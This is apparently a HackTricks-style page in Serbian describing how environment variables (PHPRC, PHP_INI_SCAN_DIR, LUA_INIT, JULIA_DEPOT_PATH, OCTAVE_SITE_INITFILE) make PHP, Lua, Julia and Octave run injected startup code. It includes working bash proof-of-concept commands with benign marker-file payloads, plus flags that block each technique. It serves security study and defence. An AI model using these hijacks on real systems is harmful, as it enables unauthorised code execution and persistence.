# Injektovanje u startup datoteku interpretera macOS-a

{{#include ../../../banners/hacktricks-training.md}}

Ove tehnike specifične za runtime koriste nasleđene promenljive okruženja za izbor početne konfiguracije ili koda koji se izvršava pre predviđene skripte. Lua podržava i varijantu sa umetnutim kodom.

## Početna konfiguracija PHP-a

### `PHPRC` / `PHP_INI_SCAN_DIR` i `auto_prepend_file`

PHP CLI i CGI učitavaju konfiguraciju pri svakom pokretanju. `PHPRC` može da odabere `php.ini` datoteku dostupnu napadaču, dok `PHP_INI_SCAN_DIR` može da preusmeri direktorijum u kom se traže dodatne `.ini` datoteke. Direktiva `auto_prepend_file` nalaže PHP-u da obradi datoteku pre tražene skripte, pa ova kombinacija omogućava izvršavanje koda pri pokretanju.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

Alternativa je direktorijum koji sadrži `.ini` datoteku:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

Opcija `-n` ignoriše `php.ini`; eksplicitna pouzdana putanja `-c` ima prednost u odnosu na `PHPRC`. Imajte na umu da dugotrajni serverski SAPI obično učitava konfiguraciju pri pokretanju web servera, dok CLI i CGI to rade pri svakom pozivu.<sup>[[1]](#references)</sup>

## Lua startup kod

### `LUA_INIT`

Pre obrade opcija komandne linije ili ciljnog skripta, samostalni Lua interpreter izvršava `LUA_INIT_<major>_<minor>` ili, ako verzionisana promenljiva ne postoji, `LUA_INIT`. Vrednost koja počinje sa `@` označava datoteku; svaka druga vrednost se direktno izvršava kao Lua kod. To omogućava izvršavanje pri pokretanju i iz datoteke i bez nje.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

Tačan naziv sa verzijom razlikuje se u zavisnosti od interpretera, na primer `LUA_INIT_5_4`. `lua -E` ignoriše sve promenljive okruženja, uključujući startup kod i putanje Lua modula.

## Julia depo za pokretanje

### `JULIA_DEPOT_PATH` i `startup.jl`

Julia pri pokretanju obično izvršava `config/startup.jl` iz svog prvog depoa. `JULIA_DEPOT_PATH` određuje listu depoa, pa njegovo usmeravanje na stablo čitljivo napadaču preusmerava automatski učitanu startup datoteku.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

Završni separator je koristan kada su žrtvi i dalje potrebni uobičajeni paketi. `julia --startup-file=no` onemogućava ovu startup datoteku. Obrišite promenljivu pre pokretanja jer ona takođe kontroliše registre paketa, okruženja, keševe i lokacije za učitavanje koda.

## Datoteke za pokretanje GNU Octave-a

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave tokom pokretanja izvršava nekoliko datoteka koje sadrže važeće Octave komande. `OCTAVE_SITE_INITFILE` zamenjuje startup datoteku za ceo sajt, a `OCTAVE_VERSION_INITFILE` zamenjuje datoteku specifičnu za verziju, pa bilo koja od ovih promenljivih može da preusmeri automatsko izvršavanje na datoteku koju napadač može da čita.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` preskače samo korisničke datoteke kao što je `~/.octaverc`; **ne** sprečava prethodno opisano prepisivanje site datoteke. Za site datoteke koristite `--no-site-file`, a za onemogućavanje svih startup datoteka `--norc` / `-f`.<sup>[[7]](#references)</sup>

## References

- [1] [PHP konfiguraciona datoteka](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Samostalni interpreter Lua 5.4](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Julia interfejs komandne linije: startup datoteka](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Julia promenljive okruženja: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [GNU Octave startup datoteke](https://docs.octave.org/latest/Startup-Files.html)
- [7] [GNU Octave opcije komandne linije](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
